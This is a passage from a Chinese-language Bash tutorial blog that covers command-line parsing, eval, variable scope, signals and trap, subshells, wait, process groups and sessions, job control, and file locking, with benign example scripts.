id="10-2-命令行解析"><a href="#10-2-命令行解析" class="headerlink" title="10.2 命令行解析"></a>10.2 命令行解析</h5><ol><li>shell 解析的过程：<ul><li>暴露给shell解析，使用双引号或不使用引号</li><li>避免给shell 解析到，就一定要放到单引号当红，或使用反斜线转义</li><li>用来解析shell的特殊符号：引号、管道符号、重定向符号、变量替换符号、进程替换、命令替换、&amp;、大小括号、空白符号（IFS） 等等<ul><li>IFS：将命令行划分成一个个的word</li></ul></li><li>shell 解析完成之后，命令行就变了。 通过 <code>cat /proc/self/cmdline</code>查看，可知空白符被替换成了<strong>NUL（\0）</strong></li></ul></li><li>命令（程序自身解析）：<ul><li>这个解析过程，在命令行中是我们无法控制的，由编写程序的程序员决定解析什么选项、什么参数、以及如何解析</li></ul></li><li>为什么要避免shell解析：<ul><li>因为某些命令中的特殊符号，和shell的特殊符号冲突了</li><li>如果，想要把这个特殊符号，留给命令自身，就不能被shell解析</li><li>如果想要把特殊符号留给shell解析，就需要将特殊符号暴露给shell去解析</li></ul></li></ol><h5 id="10-3-shell-解析命令行的细节（核心）"><a href="#10-3-shell-解析命令行的细节（核心）" class="headerlink" title="10.3  shell 解析命令行的细节（核心）"></a>10.3  <strong>shell 解析命令行的细节（核心）</strong></h5><ol><li>读取命令行</li></ol><ul><li>命令组合的特殊符号，管道、&amp;、()、；等等</li></ul><ol start="2"><li><p>划分token</p><ul><li><p>单词（word）拆分：按照$IFS拆分（默认“SPACE\t\n”）</p></li><li><p>引号和反斜线的作用：引号配对</p></li></ul></li><li><p>确定重定向的位置（&gt;截断）</p></li><li><p>命令检查（是否是某些特殊结构的命令）</p><ul><li>if、for、while、until、select、case</li></ul></li><li><p>检查是否是<strong>别名</strong></p></li><li><p>各种扩展</p><ol><li><p>大括号扩展： <code>echo {1..10};echo {a..d}、touch /tmp/{a..d}.log</code></p></li><li><p>波浪号扩展：</p><ul><li><code>~</code>：表示家目录</li><li><code>~+</code>：表示当前目录 == $PWD</li><li><code>~-</code>：表示上一次所处的路径（目录）  == $OLDPWD</li></ul></li><li><p>参数、变量替换：</p><ul><li><code>echo $name;echo $(name%%s*)</code>：<strong>变量替换是在echo进程出现前进行的</strong>，后面 name%%s* 意思是贪婪删除，知道出现s为止的所有字符，如果name=longshuai，会删除最后到s（逆向）输出long</li></ul></li><li><p>算术扩展：</p><p><code>a=44;echo $((a+6))</code></p></li><li><p>命令替换、进程替换</p><ol><li>命令替换：<code>$()</code>以及两个反引号：<code>echo $(echo hello)</code>== <code>echo haha</code></li><li>进程替换：<code>&lt;()、&gt;()</code></li></ol></li></ol></li></ol><p><strong>注意：如果进行了一个或两个 第3、4、5步中的扩展，会再次进行单词拆分（只有未在引号中进行扩展，才会进行这一单词拆分的过程，被包含在引号中就不会拆分了）</strong></p><ol start="6"><li><p>文件名通配符扩展</p><ul><li><code>*</code>不能匹配以点开头的隐藏文件，除非开启匹配选项（shopt -s dotglob）</li><li><code>*</code>默认不能递归到子目录去匹配，除非开启（shopt -s globstar），使用<code>**/*.c</code>即可到子目录的.c文件下搜索</li><li>shopt -s extglob ：扩展shell下的通配功能，使用正则。</li></ul></li></ol><ol start="7"><li><p>引号去除：</p><ul><li>命令自身是不需要引号的</li></ul></li><li><p>搜索命令</p><ol><li>判断相对路径、绝对路径：斜杠</li><li>检查是否有同名函数</li><li>是否是bash内置命令</li><li>$PATH</li></ol></li><li><p>fork+exec</p></li><li><p>执行命令</p><ol><li>解析选项、参数</li><li>执行主代码逻辑</li><li>退出；返回退出状态码</li><li>父bash进程收到退出状态码后为子进程收尸</li></ol></li><li><p>触发信号捕获功能 </p></li></ol><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/shell解析核心.png" style="zoom:50%;" /><p>图为  <a href="https://www.cnblogs.com/f-ck-need-u/p/7426371.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7426371.html</a>  中的图，注意双引号扩展不包括单词拆分和文件名扩展功能，图中未标注</p><p>示例：</p><pre class=" language-bash"><code class="language-bash">name<span class="token operator">=</span>longshuaia<span class="token operator">=</span>24<span class="token keyword">echo</span> -e <span class="token string">"some files:"</span> ~/i* <span class="token string">"\nThe date:<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%F<span class="token variable">)</span></span>\n<span class="token variable">$name</span>'s age is <span class="token variable"><span class="token variable">$((</span>a<span class="token operator">+</span><span class="token number">4</span><span class="token variable">))</span></span>"</span> <span class="token operator">></span>/tmp/a.log</code></pre><p>图解上面命令：</p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/shell解析.png" style="zoom:67%;" /><h5 id="10-4-eval-二次解析"><a href="#10-4-eval-二次解析" class="headerlink" title="10.4 eval 二次解析"></a>10.4 eval 二次解析</h5><pre class=" language-bash"><code class="language-bash">a<span class="token operator">=</span>hellohello<span class="token operator">=</span>xiaomage<span class="token function">eval</span> <span class="token keyword">echo</span> \$<span class="token variable">$a</span><span class="token comment" spellcheck="true"># 解析1：eval echo $hello</span><span class="token comment" spellcheck="true"># 解析2：echo $hello</span><span class="token comment" spellcheck="true">## 结果：输出xiaomage</span></code></pre><p>类似可以二次解析的命令还有time、xargs等</p><h4 id="11-作用域"><a href="#11-作用域" class="headerlink" title="11 作用域"></a>11 作用域</h4><ol><li>函数自动全局和局部修饰local<ul><li>shell中自定义函数也是默认全局作用域，除非使用local 修饰该变量</li></ul></li><li>子shell 不影响父shell 环境<ul><li>通过子shell 也可以实现局部作用域</li></ul></li><li>词法作用域<ul><li>文本定义（函数定义）位置决定了作用域的课件范围，在哪定义就属于哪个作用域</li></ul></li><li>动态作用域<ul><li>文本调用位置决定作用域可见范围，在哪调用就属于哪个作用域</li></ul></li><li>bash 采取动态作用域</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># 1.动态作用域规则：文本调用位置决定作用域范围，</span><span class="token comment" spellcheck="true">#        因为f()是在g()函数内部调用的，而且g()函数内部定义了局部变量x</span><span class="token comment" spellcheck="true">#        所以，调用f()函数的时候，f()内部访问的变量x是g()内部的局部变量</span><span class="token comment" spellcheck="true">#        所以，f()中输出的是   f: 3</span><span class="token comment" spellcheck="true">#        而且，f()修改的变量x也是g()中的局部变量x</span><span class="token comment" spellcheck="true">#        于是，在g()中的echo输出的是  g: 2</span><span class="token comment" spellcheck="true"># 整个输出结果：</span><span class="token comment" spellcheck="true"># f: 3</span><span class="token comment" spellcheck="true"># g: 2</span><span class="token comment" spellcheck="true"># 1</span><span class="token comment" spellcheck="true"># shell 使用动态作用域，所以会显示这个</span><span class="token comment" spellcheck="true">#2.词法作用域规则：文本定义位置决定作用域范围</span><span class="token comment" spellcheck="true">#        因为f()和g()是定义在全局范围内的，所以，f()和g()内部访问的变量x都是全局变量x</span><span class="token comment" spellcheck="true">#        但是g()函数内部使用local修改了局部变量x，使得local语句之后的所有访问变量x的语句都只能访问到局部变量x</span><span class="token comment" spellcheck="true">#        所以，f()中访问的变量x是全局变量x=1，修改的也是全局变量x</span><span class="token comment" spellcheck="true">#        g()访问的变量x是局部变量x=3</span><span class="token comment" spellcheck="true">#        注意：f()和g()访问的变量不一样</span><span class="token comment" spellcheck="true"># 输出结果：</span><span class="token comment" spellcheck="true"># f: 1</span><span class="token comment" spellcheck="true"># g: 3</span><span class="token comment" spellcheck="true"># 2</span>x<span class="token operator">=</span>1<span class="token keyword">function</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"f: <span class="token variable">$x</span>"</span><span class="token punctuation">;</span>    x<span class="token operator">=</span>2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> g<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    local x<span class="token operator">=</span>3<span class="token punctuation">;</span>    f<span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"g: <span class="token variable">$x</span>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>g<span class="token keyword">echo</span> <span class="token variable">$x</span></code></pre><h4 id="12-信号和信号捕捉"><a href="#12-信号和信号捕捉" class="headerlink" title="12 信号和信号捕捉"></a>12 信号和信号捕捉</h4><h5 id="12-1-操作系统中的信号"><a href="#12-1-操作系统中的信号" class="headerlink" title="12.1 操作系统中的信号"></a>12.1 操作系统中的信号</h5><ol><li>软中断：从软件的角度上去打断进程的正常执行流程</li><li>异步<ul><li>信号是随时可能产生的</li><li>信号产生后，可能会等待一段时间才会发送给进程</li><li>进程接收到信号后，仍然可能会等待一段时间才会去处理信号</li></ul></li><li>注册信号处理程序，自定义处理逻辑</li><li>谁发送信号<ul><li>内核</li><li>进程自身发送信号给自己</li><li>进程1发送信号给进程2</li></ul></li><li>每个信号都有一个自己的数值编号<ul><li>HUP</li><li>SIGHUP</li></ul></li><li>信号的分类：<ul><li>标准信号（1-31）</li><li>实时信号（34-64）</li></ul></li><li>不同操作系统类型对有些信号的实现是不一样的，编号也可能不一样</li></ol><h5 id="12-2-常见信号"><a href="#12-2-常见信号" class="headerlink" title="12.2 常见信号"></a>12.2 常见信号</h5><p><code>kill -l</code>：查看所有信号。标准信号（1-31）、实时信号（34-64）</p><ul><li>HUP(1)：hang up<ul><li>终止“普通”进程。只要进程没有脱离终端，就是“普通”进程</li><li>当终端断开连接的时候，内核会发送HUP信号给控制进程（产生链式反应）。控制进程会将HUP信号继续发送给终端内的所有进程</li><li>发送HUP信号给daemon（守护进程）类进程时，不会终止进程，而是让这类进程重读配置文件，实现 graceful restart的功能c</li></ul></li><li>INT(2)：<strong>Ctrl + C</strong> <ul><li>Ctrl + C 和 INT 信号是有区别的：前者是发送给整个进程组，会影响进程组内的所有进程；后者是发送给进程组的leader进程，不会影响进程组内的其他进程。<strong>kill -INT -PGID</strong></li></ul></li><li>KILL(9)：必杀信号（实在没有办法采用，一般不用）</li><li>TERM(15)：终止进程的标准信号，比kill(9)好多了</li></ul><p><strong>注意：上面四个信号以及 0信号 必须掌握</strong></p><ul><li>TSTP：<strong>Ctrl + Z</strong> <ul><li>让前台的进程进入后台，并进入stop状态（注意这不是终止进程，仅仅是停止，可恢复）</li></ul></li><li>CONT：让stop状态的进程提到前台，继续运行 runing <code>fg命令</code></li><li>QUIT：<strong>Ctrl + \</strong><ul><li>比term信号好一点，会产生coredump文件 </li></ul></li><li>CHLD：<ul><li>内核发送CHLD信号给父进程，<strong>通知</strong>父进程它有子进程已经终止了，仅仅是通知（收尸是父进程使用wait/waitpid）</li></ul></li><li>WINCH：<ul><li>当一个窗口尺寸发生改变时，就会发送此信号。</li><li>对后台进程而言，他们没有窗口，所以默认情况下 WINCH 是不起作用的，所以，程序员就可以去对后台进程注册 WINCH 信号的处理程序，实现自定义的处理逻辑</li></ul></li><li>STOP、USR1、USR2、TTIN、TTOU……</li><li>特殊信号（0）：检查进程是否存在</li></ul><h5 id="12-3-shell中发送信号的方式"><a href="#12-3-shell中发送信号的方式" class="headerlink" title="12.3 shell中发送信号的方式"></a>12.3 shell中发送信号的方式</h5><ol><li>kill 类命令 <code>kill -CONT %1</code>：给后台进程id为1 的进程发送CONT信号</li><li>快捷键：Ctrl + （C、Z、\）：<strong>对于脱离了终端的后台进程无效</strong></li></ol><h5 id="12-4-shell-中-trap-捕获信号"><a href="#12-4-shell-中-trap-捕获信号" class="headerlink" title="12.4 shell 中 trap 捕获信号"></a>12.4 shell 中 trap 捕获信号</h5><ol><li>trap：shell中用来注册信号处理程序</li><li>执行命令列表：<code>trap &#39;cmdlist&#39; sig_list</code></li><li>忽略信号：<code>trap &#39;&#39; sig_list</code></li><li>重置信号：<code>trap  - sig_list</code>：重置为刚登陆时的那种状态  </li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">trap</span> <span class="token string">"echo trapped"</span> INT  <span class="token comment" spellcheck="true">## 定义：当捕获到INT信号时（按CTRL + c），就输出trapped</span><span class="token function">trap</span> <span class="token string">"echo trapped;echo haha;echo hehe;"</span> INT QUIT TERM <span class="token comment" spellcheck="true">##可以给多个信号同时定义多个命令</span><span class="token function">trap</span> <span class="token string">''</span> INT <span class="token comment" spellcheck="true">## 定义为忽略信号，按ctrl + C 没有任何反应</span><span class="token function">trap</span> - SIGHUP INT QUIT TERM  <span class="token comment" spellcheck="true">## 全部重置掉</span></code></pre><ol start="5"><li>在shell脚本中使用trap<ul><li>清理临时文件</li><li>清理脚本中的后台进程</li><li>使用<code>kill 0</code> 杀掉整个进程组</li></ul></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 清理临时文件</span><span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token function">trap</span> <span class="token string">"echo trapped;rm -rf <span class="token variable">$tmp_dir</span>;exit 1 "</span> INT HUP QUIT TERM<span class="token comment" spellcheck="true"># trap 'echo trapped;rm -rf $tmp_file;exit 1' EXIT</span>tmp_dir<span class="token operator">=</span>/tmp/<span class="token variable">$BASHPID</span><span class="token function">mkdir</span> <span class="token variable">$tmp_dir</span><span class="token function">touch</span> <span class="token variable">$tmp_dir</span>/<span class="token punctuation">{</span>a<span class="token punctuation">..</span>d<span class="token punctuation">}</span>.tmp<span class="token function">ls</span> <span class="token variable">$tmp_dir</span><span class="token function">sleep</span> 5<span class="token comment" spellcheck="true">## 前台进入睡眠时，按ctrl + c 停止，即可看见清理文件的作用，查看一下临时文件是否还在</span><span class="token function">rm</span> -rf <span class="token variable">$tmp_dir</span><span class="token keyword">echo</span> <span class="token string">'over'</span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 清理脚本中的后台进程</span><span class="token keyword">function</span> signal_handle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> trapped    <span class="token function">kill</span> <span class="token variable">$pid</span>    <span class="token keyword">exit</span> 1<span class="token punctuation">}</span><span class="token function">trap</span> <span class="token string">'signal_handle'</span> INT HUP QUIT TERM <span class="token comment" spellcheck="true"># trap 'signal_handle' EXIT </span><span class="token function">sleep</span> 20 <span class="token operator">&amp;</span>pid <span class="token operator">=</span> <span class="token variable">$!</span><span class="token function">sleep</span> 20 <span class="token operator">&amp;</span>pid<span class="token operator">=</span><span class="token string">"<span class="token variable">$!</span>  <span class="token variable">$pid</span>"</span><span class="token function">sleep</span> 5</code></pre><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>                 <span class="token comment" spellcheck="true"># 使用kill 0 杀当前进程</span><span class="token keyword">function</span> signal_handle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> trapped    <span class="token function">kill</span> -TERM 0   <span class="token comment" spellcheck="true">## 通过发送TERM信号杀掉整个进程组，因为脚本运行时，脚本进程就是当前进程组的leader进程</span>                   <span class="token comment" spellcheck="true">## 不推荐使用 QUIT INT ，快捷键发送的信号对后台进程没有效果的</span>    <span class="token keyword">exit</span> 1<span class="token punctuation">}</span><span class="token function">trap</span> <span class="token string">'signal_handle'</span> EXIT<span class="token function">sleep</span> 10 <span class="token operator">&amp;</span><span class="token function">sleep</span> 20 <span class="token operator">&amp;</span><span class="token function">sleep</span> 5</code></pre><h5 id="12-5-shell中信号和trap-的注意事项"><a href="#12-5-shell中信号和trap-的注意事项" class="headerlink" title="12.5  shell中信号和trap 的注意事项"></a>12.5  shell中信号和trap 的注意事项</h5><ol><li><p>trap 是bash内置命令，它守护的是bash环境</p></li><li><p>接收到信号后，会等待正在执行的前台任务完成后才去触发信号处理程序。原因：shell认为前台进程都是重要任务</p></li><li><p>trap 设置的信号守护 是对bash 运行环境的设置，可能会被子shell继承：只有忽略类型的信号会被子shell继承</p></li><li><p>信号守护是有范围的</p></li><li><p>交互式shell 会忽略 TERM 信号（<code>killall bash</code>发送的就是TERM 信号）；在任何情况下，bash都会忽略 QUIT 信号</p></li><li><p>特殊信号：</p><ul><li>ERR 信号：bash 出错的时候，set -e</li><li>EXIT 信号：bash 退出的时候（KILL信号例外）</li></ul></li></ol><h4 id="13-子shell"><a href="#13-子shell" class="headerlink" title="13  子shell"></a>13  子shell</h4><h5 id="13-1-什么是子shell"><a href="#13-1-什么是子shell" class="headerlink" title="13.1  什么是子shell"></a>13.1  什么是子shell</h5><ol><li>是子进程？（不一定）</li><li>子shell（bash 进程）</li><li>不考虑进程，只考虑shell环境</li></ol><h5 id="13-2-子shell为什么这么重要"><a href="#13-2-子shell为什么这么重要" class="headerlink" title="13.2  子shell为什么这么重要"></a>13.2  子shell为什么这么重要</h5><ul><li>不考虑进程，只考虑shell环境</li></ul><h5 id="13-3-bash内置命令和函数的特殊性"><a href="#13-3-bash内置命令和函数的特殊性" class="headerlink" title="13.3  bash内置命令和函数的特殊性"></a>13.3  bash内置命令和函数的特殊性</h5><ol><li>不需要开启新的进程</li><li>它们依赖于shell环境，没有shell环境，就没法执行</li></ol><h5 id="13-4-子shell的特点"><a href="#13-4-子shell的特点" class="headerlink" title="13.4  子shell的特点"></a>13.4  子shell的特点</h5><ol><li>按需继承父shell 环境、不影响父shell</li><li>当前shell中执行：<code>source</code>（return语句）（仅影响当前shell）、<code>{}</code>（仅影响当前shell）</li><li>子shell中执行：<code>()</code>（仅在子shell中生效）</li></ol><h5 id="13-5-什么时候进入新的shell环境"><a href="#13-5-什么时候进入新的shell环境" class="headerlink" title="13.5  什么时候进入新的shell环境"></a>13.5  什么时候进入新的shell环境</h5><ul><li><p>两个特殊的变量</p><ul><li><code>$BASHPID</code>：常用，查看bash PID</li><li><code>$BASH_SUBSHELL</code>：查看当前所处的是第几层嵌套环境</li></ul></li><li><p>普通命令：<code>?(N)</code></p></li><li><p>bash 内置命令 <code>?(N)</code>，但放管道后<code>?(Y)</code></p></li><li><p>管道<code>?(Y)</code>：开启进程组，两个子shell环境</p></li><li><p>bash 命令自身 <code>bash</code>，<code>?(Y)</code></p></li><li><p><code>(cmd1;cmd2;cmd3…)</code>，<code>?(Y)</code></p></li><li><p><code>{cmd1;cmd2;cmd3;…;}</code>，<code>?(N)</code></p></li><li><p>命令替换<code>?(Y)</code></p></li><li><p>进程替换<code>?(Y)</code></p></li><li><p>后台任务<code>?(Y)</code></p></li><li><p>直接执行shell脚本<code>?(Y)</code>，但source脚本除外<code>?(N)</code></p></li></ul><p><strong>注意：进入新shell环境的共同点：fork 进程时，需要shell解析（比如特殊符号）特殊：source 是bash 内置命令，所以不会进入子shell</strong></p><h4 id="14-wait-命令"><a href="#14-wait-命令" class="headerlink" title="14  wait 命令"></a>14  wait 命令</h4><ol><li>子进程需要等待 收尸</li><li>wait()、waitpid()</li><li>再看命令生命周期：shell前台进程<ul><li>fork之后两个进程分支</li><li>子进程exec加载新程序</li><li>父进程wait()，进入阻塞，等待给子进程收尸</li></ul></li><li>bash的wait()：<ul><li>wait pid1 pid2 pid3 …</li><li>wait job1 job2 job3 …</li><li>wait pid jobid</li><li>无参数wait()：<strong>等待所有子进程</strong>(特别实用)</li><li>wait的好处：<strong>解决前后有依赖性的命令</strong>：例如软件安装配置脚本，需要等待软件包安装完以后，再执行自动配置操作</li></ul></li></ol><h4 id="15-终端、进程组、会话、shell"><a href="#15-终端、进程组、会话、shell" class="headerlink" title="15  终端、进程组、会话、shell"></a>15  终端、进程组、会话、shell</h4><h5 id="15-1-登录终端"><a href="#15-1-登录终端" class="headerlink" title="15.1  登录终端"></a>15.1  登录终端</h5><ol><li>登录控制台终端的过程：<ol><li>init 加载 getty 程序：根据/etc/inittab 决定加载的终端</li><li>getty进程open终端设备（文件）（虚拟终端）<ul><li>打开文件描述符 0、1、2</li><li>显示login 提示输入用户名</li></ul></li><li>getty 加载login进程</li><li>login 进程提示输入密码、验证、加载shell</li></ol></li><li>网络登录终端（如ssh）<ol><li>sshd 等待客户端连接</li><li>sshd 打开<strong>伪终端</strong><ol><li>打开文件描述符0、1、2</li><li>显示login 提示输入用户名</li></ol></li><li>fork 子进程：子进程加载login程序，父进程sshd继续监听</li><li>login验证用户登录，加载shell</li></ol></li></ol><h5 id="15-2-进程组"><a href="#15-2-进程组" class="headerlink" title="15.2  进程组"></a>15.2  进程组</h5><ol><li><p>标识：PGID</p></li><li><p>是进程的集合，每个进程都有所属进程组</p></li><li><p>每个进程组都有leader进程 <strong>leader的pid==进程组的pgid</strong></p></li><li><p>子进程创建出来时会继承父进程所属进程组的ID</p></li><li><p>脱离组忽略组信号：例如独自成组（<code>setpgid()</code>）</p></li><li><p>进程组的好处：</p><ul><li>为实现shell提供支持</li><li>使得waitpid()可以等待整个进程组</li><li>可以发送信号给整个进程组</li></ul><hr></li><li><p>shell（如bash）登录后，shell是一个进程组</p></li><li><p>shell中通过管道成立进程组</p></li><li><p>支持作业系统的bash，执行每个命令都独自成组</p></li></ol><h5 id="15-3-会话"><a href="#15-3-会话" class="headerlink" title="15.3  会话"></a>15.3  会话</h5><ol><li><p>标识：SESSION ID/SID</p></li><li><p>是进程组的集合，包含一个或多个进程组</p></li><li><p>每个session有leader：session创建者进程</p></li><li><p>子进程创建出来时会继承父进程所属session id</p></li><li><p>setsid()函数</p><ol><li>创建session和第一个process group</li><li>进程自己成为session leader和group leader</li><li>setsid设置的会话是没有控制终端的，如果之前有，将会切断会脱离终端</li><li>daemon类进程，会调用setsid()来脱离终端，成立独自的session</li></ol></li><li><p>存在一个setsid 命令（不是函数）：将进程放入一个新session中，脱离终端</p></li><li><p>存在一个daemon/daemonize令：将某个进程运行成daemon进程（脱离终端，新session）</p></li></ol><h5 id="15-4-终端、会话、进程组、shell、普通进程-的关系"><a href="#15-4-终端、会话、进程组、shell、普通进程-的关系" class="headerlink" title="15.4 终端、会话、进程组、shell、普通进程 的关系"></a>15.4 终端、会话、进程组、shell、普通进程 的关系</h5><p>关系：（军营、军队、小分队、将军、小兵）</p><h6 id="15-4-1"><a href="#15-4-1" class="headerlink" title="15.4.1"></a>15.4.1</h6><ol><li><p>类比：</p><ul><li>终端–&gt; 军营</li><li>会话–&gt; 军队</li><li>进程组–&gt; 小分队</li><li>登录终端时的shell 进程 –&gt; 将军</li><li>普通的进程–&gt; 小兵</li></ul></li><li><p>session 可以用于0或1个终端</p></li><li><p>控制终端是谁创建的</p><ul><li><p>终端由getty 或sshd 创建</p></li><li><p>user login之后将创建一个session，此时session还没有绑定终端</p></li><li><p>session leader 绑定一个终端，该终端将成为session的<strong>控制终端</strong></p></li></ul></li><li><p>终端的控制进程：</p><ul><li>该session leader将成为终端的控制进程：shell 进程</li><li>是控制进程的标志：当该进程与终端断开时，内核发送SIGHUP信号给该控制进程（session leader），从而引起链式反应</li><li><strong>结果是：该终端上的所有任务都被终止，或者直接脱离终端</strong></li><li>另一角度看，控制进程断开连接后，终端和会话就断开了，需要和会话中的其他进程也断开关系</li></ul></li><li><p>在有终端的会话中</p><ul><li>只有一个前台进程组，n(n&gt;0)个后台进程组</li><li><strong>键盘发送的信号都发送给前台进程组：Ctrl + c/z</strong></li><li>tcsetpgrp()可将某进程组设置为终端的前台进程组（fg）</li></ul></li><li><p>在没有终端的会话中</p><ul><li>setsid()设置的会话是没有终端的</li><li>没有终端的会话是脱离终端的，父进程死掉后会被pid=1的init/systemd收养</li></ul></li></ol><h6 id="15-4-2-一些命令"><a href="#15-4-2-一些命令" class="headerlink" title="15.4.2 一些命令"></a>15.4.2 一些命令</h6><ul><li><code>ps -o  pid,ppid,pgid,tpgid,sid,tty,comm</code>===  <code>ps j</code><ul><li>pid：  进程id、ppid：父进程ID</li><li>pgid：进程组ID、sid：会话ID</li><li>tpgid： 这个进程所属会话对应的终端的前台进程组ID</li></ul></li></ul><pre class=" language-bash"><code class="language-bash"><span class="token function">ps</span> j<span class="token function">ps</span> j <span class="token operator">&amp;</span><span class="token function">ps</span> j <span class="token operator">&amp;</span> <span class="token operator">|</span> <span class="token function">cat</span><span class="token function">ps</span> j <span class="token operator">|</span> <span class="token function">cat</span> <span class="token operator">&amp;</span> </code></pre><h6 id="15-4-3-进程脱离终端的几种方法"><a href="#15-4-3-进程脱离终端的几种方法" class="headerlink" title="15.4.3 进程脱离终端的几种方法"></a>15.4.3 进程脱离终端的几种方法</h6><ol><li>脱离终端方法论：从当前shell中脱离，成为孤儿进程或孤儿进程组</li><li>nohup、screen、tmux</li><li>((cmd)&amp;) 、(cmd&amp;)</li><li>子shell中忽略SIGHUP信号：<code>trap  ‘’  SIGHUP</code></li><li>disown</li><li>setsid</li><li>daemon或daemonize  创建daemon类进程<ol><li>父进程pid = 1</li><li>没有（脱离）终端</li><li>自己成立session、 process group</li><li>关闭std{in/out/err}</li><li>chdir到/，防止文件系统卸载导致进程错误</li><li>清空umask，使得进程可以按权限需求创建文件</li></ol></li><li><strong>脱离终端注意事项：重定向需要关闭否？</strong></li></ol><h4 id="16-作业-job"><a href="#16-作业-job" class="headerlink" title="16 作业 job"></a>16 作业 job</h4><ol><li><p>没有脱离 shell 的进程组就是作业</p><ol><li>作业中可以有一个或多个进程</li><li>一个作业称之为一个pipeline</li><li>作业中的多个进程通过管道组合</li></ol></li><li><p>作业和shell的关系</p><ol><li>作业控制是shell的一个特性</li><li>一个shell可以执行多个作业，一个前台，多个后台</li><li>作业是属于shell的，当前shell下只能查看自己的作业信息</li></ol></li><li><p>作业状态</p><ol><li><p>running（包含两种进程状态的进程：）</p><ul><li>正在被调度执行的进程</li><li>正处于就绪队列的进程</li></ul></li><li><p>stopped：它并<strong>不</strong>代表进程真的完全停止不运行了</p></li><li><p>done</p></li><li><p>JOBID 标识每个作业：%jobid 查看进程</p></li><li><p><code>+符号</code>代表CPU当前正在执行的作业</p><p><code>-符号</code>代表操作系统下次调度的进程</p></li></ol></li><li><p>作业控制</p><ul><li>通过Ctrl + Z （ sigtstp 信号）、fg(CONT)前台运行、bg(CONT)后台运行</li><li>每个 shell 都维护属于自己的作业表</li><li>通过一张作业表记录当前的作业</li><li>disown可将作业（进程组）移出作业表，<strong>使之脱离终端</strong><ul><li>disown [-a|-r] [-h] [JOBID]</li><li>不加-h表示将任务从表中移出，加-h表示不移除，但设置忽略SIGHUP 信号</li><li>-a 表示对所有任务失效</li><li>-r 表示对当前running状态任务生效</li><li>如果既没有给-a、-r也没有jobid，那么操作的是+符号的作用</li></ul></li></ul></li></ol><h4 id="17-shell-的一些技巧或脚本规范"><a href="#17-shell-的一些技巧或脚本规范" class="headerlink" title="17 shell 的一些技巧或脚本规范"></a>17 shell 的一些技巧或脚本规范</h4><h5 id="17-1-文件锁"><a href="#17-1-文件锁" class="headerlink" title="17.1  文件锁"></a>17.1  文件锁</h5><p>劝告锁：要求双方或多方都同时使用同样的锁机制，否则文件锁就失去意义</p><ol><li>通过文件存在性判断</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#!/usr/bin/bash</span><span class="token function">trap</span> <span class="token string">'echo "trapped";rm -rf <span class="token variable">${lock_file}</span>;exit'</span> EXITlock_file<span class="token operator">=</span>/var/lock/mylock<span class="token keyword">while</span> <span class="token punctuation">[</span>-f <span class="token string">"<span class="token variable">${lock_file}</span>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token keyword">echo</span> <span class="token string">"locked..."</span>    <span class="token function">sleep</span> 1<span class="token keyword">done</span><span class="token function">touch</span> <span class="token variable">${lock_file}</span><span class="token comment" spellcheck="true">##  上面就是用文件存在性来判断文件锁；其他文件也需要这样判断</span><span class="token function">timeout</span> 5 <span class="token function">bash</span> -c <span class="token string">'while true;do    echo "lock1.sh:`date +'</span>%T<span class="token string">'`" >> /tmp/a.log    sleep 1done'</span><span class="token comment" spellcheck="true">##  同理可以将上面的语句写成一个头文件（API）函数</span><span class="token comment" spellcheck="true">##  注意需要在引用它的文件中使用source加载进shell环境。</span><span class="token comment" spellcheck="true"># API 文件：</span><span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token keyword">function</span> lockfile<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">trap</span> <span class="token string">'echo "trapped";rm -rf <span class="token variable">${lock_file}</span>;exit'</span> EXIT    lock_file<span class="token operator">=</span><span class="token variable">$1</span>    <span class="token keyword">while</span> <span class="token punctuation">[</span>-f <span class="token string">"<span class="token variable">${lock_file}</span>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">do</span>        <span class="token keyword">echo</span> <span class="token string">"locked..."</span>        <span class="token function">sleep</span> 1    <span class="token keyword">done</span>    <span class="token function">touch</span> <span class="token variable">${lock_file}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">## lock333.sh</span><span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token punctuation">[</span>-f <span class="token string">"lockfile.sh"</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">source</span> lockfile.sh <span class="token operator">||</span> <span class="token punctuation">{</span>echo <span class="token string">"lockfile.sh not exit"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span><span class="token punctuation">}</span>lock_file<span class="token operator">=</span>/var/lock/mylocklockfile <span class="token variable">${lock_file}</span><span class="token function">timeout</span> 5 <span class="token function">bash</span> -c <span class="token string">'while true;do    echo "lock1.sh:`date +'</span>%T<span class="token string">'`" >> /tmp/a.log    sleep 1done'</span></code></pre><ol start="2"><li>flock 文件锁 <code>lslocks</code>查看锁、<code>man flock</code>查看手册<ul><li>排他锁（独占锁、互斥锁、写锁，X）（仅有一个能申请排他锁）</li><li>共享锁（读锁，S）（可存在多个）（共享锁与排他锁不可共存）</li></ul></li></ol><pre class=" language-bash"><code class="language-bash">flock -s a.lock <span class="token keyword">echo</span> hahaflock -x a.lock <span 